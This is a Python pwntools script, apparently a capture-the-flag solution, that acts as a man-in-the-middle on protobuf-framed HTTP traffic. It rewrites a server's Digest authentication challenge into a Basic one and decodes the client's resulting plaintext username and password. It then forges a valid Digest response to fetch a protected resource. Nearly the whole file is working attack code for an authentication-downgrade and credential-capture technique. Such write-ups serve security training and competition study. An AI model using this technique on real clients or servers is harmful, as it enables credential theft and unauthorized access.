from pwn import *
import sys
import struct
import binascii
import format_pb2
import md5
import re
from itertools import permutations

context(arch='x86_64', os='linux')

def m(i):
	o = md5.new()
	o.update(i)
	return o.hexdigest()

def calc_pass(username, realm, password, method, uri, nonce, nc, cnonce, qop="auth"):
	HA1 = m(username +":"+ realm +":"+ password)
	HA2 = m(method +":"+ uri)
	RESPONSE = m(HA1 +":"+ nonce + ":" + nc +":" + cnonce + ":" + qop + ":" + HA2)
	return RESPONSE


conn = remote('ssl-added-and-removed-here.ctfcompetition.com', 20691, ssl=True)

def read_msg():
	length = u32(conn.recv(4))
	request = format_pb2.Exchange()
	data = conn.recv(length)
	request.ParseFromString(data)
	log.info("< %s" % request)
	return request

def send_msg(payload):
	log.warn("> %s" % payload)
	data = payload.SerializeToString()
	output = p32(len(data)) + data
	conn.send(output)

# Request
i = read_msg()
send_msg(i)

# Response (401 Unauthorized)
i = read_msg()
auth_header = i.reply.headers[1].value

auth_header = re.search('Digest realm="(.*?)",qop="auth",nonce="(.*?)",opaque="(.*?)"', auth_header)

realm  = auth_header.group(1)
nonce  = auth_header.group(2)
opaque = auth_header.group(3)
log.info("got realm [%s] nonce [%s] opaque [%s]" % (realm,nonce,opaque))

i.reply.headers[1].value = "Basic realm=\"%s\"" % realm
log.info("overriding header %s" % auth_header)
send_msg(i)

# Request (w request info)
i = read_msg()

auth_header = i.request.headers[0].value[6:]
auth_header = base64.b64decode(auth_header)
log.info("Got: %s" % auth_header)

upw = auth_header.split(':')
username = upw[0]
password = upw[1]

log.info("got username=[%s] password=[%s]" % (username, password))
uri = "/protected/secret"
nc = "00000001"
cnonce="0a4f113b"
response = calc_pass(username, realm, password, "GET", uri, nonce, nc, cnonce)

i.request.uri = uri 

auth_header = 'Digest username="%s",realm="%s",nonce="%s",uri="%s",qop=auth,nc=%s,cnonce="%s",response="%s",opaque="%s"' % (username,realm,nonce,uri,nc, cnonce, response,opaque)

log.info("overriding header %s" % auth_header)
i.request.headers[0].value = auth_header
send_msg(i)

# Response (w token hopefully)
i = read_msg()
send_msg(i)
